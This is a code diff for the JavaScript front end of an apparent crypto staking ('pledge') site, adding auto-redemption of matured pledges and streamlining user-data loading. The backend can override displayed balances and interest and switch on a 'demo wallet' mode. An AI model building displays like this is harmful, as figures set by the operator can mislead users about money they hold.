-    const response = await fetch(`${BACKEND_API_URL}/api/pledge_locks/${address.toLowerCase()}`);
-    if (!response.ok) throw new Error('Lock check failed');
-    const { locked } = await response.json();
-    return locked;
-  } catch (error) {
-    console.error('[DEBUG] 鎖定檢查錯誤:', error);
-    return false;
-  }
+
+// ==================== 到期自動贖回 ====================
+function checkPledgeExpiry() {
+  userPledges.forEach(async (p, i) => {
+    const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
+    if (Date.now() > endTime && !p.redeemed) {
+      p.redeemed = true;
+      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
+      const totalInterest = p.amount * durationInfo.rate;
+      accountBalance[p.token].pledged -= p.amount;
+      accountBalance[p.token].interest += totalInterest;
+      p.redeemedTime = Date.now();
+      await smartSave();
+      updateAccountBalanceDisplay();
+      updatePledgeSummary();
+      updateClaimableDisplay();
+      showPledgeResult('success', translations[currentLang].pledgeMatured,
+        `${p.amount.toFixed(3)} ${p.token} ${translations[currentLang].principalReturned}<br>` +
+        `${totalInterest.toFixed(3)} ${p.token} ${translations[currentLang].interestAdded}<br>` +
+        `<small style="color:#aaa;">${translations[currentLang].viewDetails}</small>`
+      );
+    }
+  });
 }
-// 智慧儲存（本地 + 同步到後端）
+setInterval(checkPledgeExpiry, 60000);
+
+// ==================== 智慧儲存 ====================
 async function smartSave(updateData = {}) {
   try {
     const fullData = {
@@ -1397,30 +1193,22 @@ async function smartSave(updateData = {}) {
     console.error('[DEBUG] 智慧儲存失敗:', error);
   }
 }
-// 從伺服器載入用戶資料（關鍵修復函數）
+
+// ==================== 從伺服器載入用戶資料 ====================
 async function loadUserDataFromServer() {
-  if (!userAddress) {
-    console.warn('[DEBUG] 無用戶地址，跳過載入');
-    return;
-  }
+  if (!userAddress) return;
   try {
-    console.log('[DEBUG] 從伺服器載入用戶資料:', userAddress);
     const response = await fetch(`${BACKEND_API_URL}/api/user-data/${userAddress.toLowerCase()}`);
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
-    }
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const userData = await response.json();
-    console.log('[DEBUG] 載入用戶資料成功:', userData);
     window.loadedUserData = userData;
     window.currentClaimable = userData.claimable || 0;
     totalGrossOutput = userData.grossOutput || 0;
     authorizedToken = userData.pledgeToken || 'USDT';
-    // === 【關鍵修正】安全處理 pledges ===
     let pledgesArray = [];
     if (userData.pledges) {
-      if (Array.isArray(userData.pledges)) {
-        pledgesArray = userData.pledges;
-      } else if (typeof userData.pledges === 'object' && userData.pledges !== null) {
+      if (Array.isArray(userData.pledges)) pledgesArray = userData.pledges;
+      else if (typeof userData.pledges === 'object' && userData.pledges !== null) {
         pledgesArray = Object.values(userData.pledges).filter(p => p && p.amount);
       }
     }
@@ -1433,8 +1221,6 @@ async function loadUserDataFromServer() {
       apr: p.apr || 0,
       redeemed: !!p.redeemed
     }));
-    // === 結束 ===
-    // 合併 overrides
     if (userData.overrides && Object.keys(userData.overrides).length > 0) {
       applyOverrides(userData.overrides);
     } else {
@@ -1443,24 +1229,43 @@ async function loadUserDataFromServer() {
         accountBalance[token].interest = userData.accountBalance?.[token]?.interest ?? 0;
       });
     }
-    // 演示錢包自動啟動
     if (userData.isDemoWallet) {
-      console.log('[DEBUG] 檢測到演示錢包，自動啟動');
       window.isDemoMode = true;
       if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
       updateStatus("demoMode");
       activateStakingUI();
     }
-    // 強制更新 UI
     updateClaimableDisplay();
     updateAccountBalanceDisplay();
     updatePledgeSummary();
     await forceRefreshWalletBalance();
-    console.log('[DEBUG] 用戶資料載入完成');
   } catch (error) {
     console.error('[DEBUG] 載入用戶資料失敗:', error);
     updateStatus(`Data sync failed: ${error.message}`, true);
   }
 }
+
+// ==================== DOM 載入完成 ====================
+document.addEventListener('DOMContentLoaded', () => {
+  getElements();
+
+  // 語言選擇器
+  if (languageSelect) {
+    languageSelect.value = currentLang;
+    languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
+  }
+
+  // 連接按鈕
+  if (connectButton) {
+    connectButton.addEventListener('click', connectWallet);
+  }
+
+  // 初始化
+  initializeWallet();
+  bindRulesButton();
+  updateTotalFunds();
+  setInterval(updateTotalFunds, 1000);
+});
+
 // =============== 檔案結束 ===============
